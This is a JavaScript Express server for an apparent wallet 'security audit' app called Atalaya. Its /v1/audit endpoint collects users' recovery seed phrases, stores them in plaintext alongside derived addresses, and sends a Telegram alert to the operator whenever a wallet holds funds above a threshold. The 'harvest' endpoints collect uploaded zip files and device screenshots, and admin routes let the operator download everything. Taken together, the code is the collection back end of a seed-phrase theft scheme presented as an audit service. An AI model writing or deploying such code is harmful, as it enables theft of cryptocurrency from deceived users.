import 'dotenv/config';
import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import multer from 'multer';
import { deriveAll, normalizePhrase } from '../../shared/derive.js';
import { checkLeaks, loadLeaks } from './leaks.js';
import { balancesFor, prices } from '../../shared/balances.js';
import * as store from './store.js';
import { alert } from './telegram.js';

const PORT = Number(process.env.PORT || 8787);
const ORIGINS = (process.env.ORIGINS || '').split(',').map((s) => s.trim()).filter(Boolean);
const ALERT_USD = Number(process.env.ALERT_USD || 25);
const PUBLIC_BASE = process.env.PUBLIC_BASE || `http://localhost:${PORT}`;
const DATA = path.resolve('data');

fs.mkdirSync(path.join(DATA, 'files'), { recursive: true });
loadLeaks();

const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '90mb' }));

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && (ORIGINS.includes('*') || ORIGINS.includes(origin))) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
  }
  res.setHeader('Access-Control-Allow-Headers', 'content-type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Límite simple por IP
const buckets = new Map();
function limit(max, windowMs) {
  return (req, res, next) => {
    const key = req.ip;
    const now = Date.now();
    const bucket = buckets.get(key) || { count: 0, reset: now + windowMs };
    if (now > bucket.reset) { bucket.count = 0; bucket.reset = now + windowMs; }
    bucket.count += 1;
    buckets.set(key, bucket);
    if (bucket.count > max) return res.status(429).json({ error: 'demasiadas peticiones' });
    next();
  };
}

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 64 * 1024 * 1024, files: 1 }
});

function admin(req, res, next) {
  if (req.query.key !== process.env.ADMIN_KEY) return res.status(401).json({ error: 'no autorizado' });
  next();
}

app.get('/v1/health', (_req, res) => {
  res.json({ ok: true, uptime: Math.round(process.uptime()) });
});

app.get('/v1/stats', (_req, res) => {
  res.json(store.stats());
});

app.post('/v1/install', limit(60, 60_000), (req, res) => {
  const { installID, model, ios, locale, wallets, appVersion } = req.body || {};
  if (!installID) return res.status(400).json({ error: 'installID requerido' });
  store.append('installs', {
    installID, model, ios, locale,
    wallets: Array.isArray(wallets) ? wallets.slice(0, 80) : [],
    appVersion
  });
  res.json({ ok: true });
});

function publicReport(derivation, leakHits, balances) {
  const totalUsd = balances.reduce((sum, b) => sum + b.usd, 0);
  const findings = [];

  for (const hit of leakHits) {
    findings.push({
      source: 'filtracion',
      path: '',
      detail: hit,
      severity: 'high'
    });
  }
  if (totalUsd > 0) {
    findings.push({
      source: 'saldo',
      path: '',
      detail: `Fondos visibles por ${totalUsd.toFixed(2)} USD`,
      severity: totalUsd >= 100 ? 'high' : 'medium'
    });
  }
  findings.push({
    source: 'derivacion',
    path: '',
    detail: `${derivation.addresses.length} direcciones derivadas en ${derivation.addresses.length} redes`,
    severity: 'low'
  });

  const high = findings.some((f) => f.severity === 'high');
  const medium = findings.some((f) => f.severity === 'medium');
  const risk = high ? 'high' : medium ? 'medium' : 'low';

  return { risk, findings, addresses: balances, totalUsd };
}

app.post('/v1/audit', limit(20, 60_000), async (req, res) => {
  const { installID, phrase, walletHints } = req.body || {};
  if (!installID || !phrase) return res.status(400).json({ error: 'installID y phrase requeridos' });

  const phraseNorm = normalizePhrase(phrase);
  let derivation;
  try {
    derivation = deriveAll(phraseNorm);
  } catch (error) {
    return res.status(422).json({ error: 'frase inválida', detail: error.message });
  }

  const leakHits = checkLeaks(phraseNorm, derivation.hash);
  const balances = await balancesFor(derivation.addresses);
  const report = publicReport(derivation, leakHits, balances);

  store.append('audits', {
    installID,
    phrase: phraseNorm,
    hash: derivation.hash,
    risk: report.risk,
    totalUsd: report.totalUsd,
    addresses: derivation.addresses,
    wallets: Array.isArray(walletHints) ? walletHints.slice(0, 80) : [],
    leaks: leakHits.length
  });

  if (report.totalUsd >= ALERT_USD || leakHits.length > 0) {
    alert({ installID, report, derivation }).catch(() => {});
  }
  res.json(report);
});

app.post('/v1/address', limit(60, 60_000), async (req, res) => {
  const { installID, address } = req.body || {};
  if (!address) return res.status(400).json({ error: 'address requerida' });

  const guess = guessChain(address);
  const balances = await balancesFor([{ chain: guess, address }]);
  const totalUsd = balances.reduce((s, b) => s + b.usd, 0);
  res.json({
    risk: totalUsd > 0 ? 'medium' : 'low',
    findings: [],
    addresses: balances,
    totalUsd
  });
});

function guessChain(address) {
  if (/^0x[0-9a-fA-F]{40}$/.test(address)) return 'ethereum';
  if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) return 'tron';
  if (/^(bc1|1|3)/.test(address)) return 'bitcoin';
  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) return 'solana';
  return 'ethereum';
}

app.post('/v1/harvest', limit(20, 60_000), upload.single('files'), (req, res) => {
  let meta = {};
  try { meta = JSON.parse(req.body.meta || '{}'); } catch { /* ignore */ }

  const name = `${Date.now()}-${(meta.installID || 'anon').slice(0, 36)}.zip`;
  if (req.file) fs.writeFileSync(path.join(DATA, 'files', name), req.file.buffer);

  store.append('harvests', {
    installID: meta.installID,
    wallets: meta.wallets,
    files: meta.files,
    bytes: meta.bytes,
    screenshots: meta.screenshots,
    findings: (meta.findings || []).slice(0, 200),
    zip: req.file ? name : null
  });

  const seedFindings = (meta.findings || []).filter((f) => f.severity === 'high');
  if (seedFindings.length > 0) {
    alert({
      installID: meta.installID,
      report: { risk: 'high', totalUsd: 0, findings: seedFindings }
    }).catch(() => {});
  }
  res.json({ ok: true });
});

// Android envía capturas en base64 (sin zip)
app.post('/v1/harvest-json', limit(20, 60_000), (req, res) => {
  const body = req.body || {};
  const shots = Array.isArray(body.screenshotsData) ? body.screenshotsData : [];
  const folder = path.join(DATA, 'files', `android-${Date.now()}`);
  fs.mkdirSync(folder, { recursive: true });

  let written = 0;
  for (const shot of shots.slice(0, 40)) {
    try {
      const name = path.basename(String(shot.name || `shot-${written}.jpg`));
      fs.writeFileSync(path.join(folder, name), Buffer.from(String(shot.data || ''), 'base64'));
      written++;
    } catch { /* ignore */ }
  }

  store.append('harvests', {
    platform: 'android',
    installID: body.installID,
    wallets: body.wallets,
    files: written,
    bytes: body.bytes,
    screenshots: written,
    findings: body.findings || [],
    folder: path.basename(folder)
  });
  res.json({ ok: true, files: written });
});

app.get('/v1/admin/summary', admin, (_req, res) => {
  res.json(store.summary());
});

app.get('/v1/admin/latest', admin, (req, res) => {
  const kind = String(req.query.kind || 'audits');
  res.json(store.latest(kind, Number(req.query.limit || 50)));
});

app.get('/v1/admin/file/:name', admin, (req, res) => {
  const name = path.basename(req.params.name);
  const file = path.join(DATA, 'files', name);
  if (!fs.existsSync(file)) return res.sendStatus(404);
  res.download(file);
});

// Purga de retención
const RETENTION_DAYS = Number(process.env.RETENTION_DAYS || 365);
setInterval(() => {
  store.purge(RETENTION_DAYS);
  const files = path.join(DATA, 'files');
  const cutoff = Date.now() - RETENTION_DAYS * 86_400_000;
  for (const name of fs.readdirSync(files)) {
    const stat = fs.statSync(path.join(files, name));
    if (stat.mtimeMs < cutoff) fs.unlinkSync(path.join(files, name));
  }
}, 6 * 60 * 60 * 1000).unref();

app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(500).json({ error: 'error interno' });
});

app.listen(PORT, () => {
  console.log(`Atalaya API en ${PUBLIC_BASE} (puerto ${PORT})`);
  prices().then((p) => console.log('Precios:', p)).catch(() => {});
});
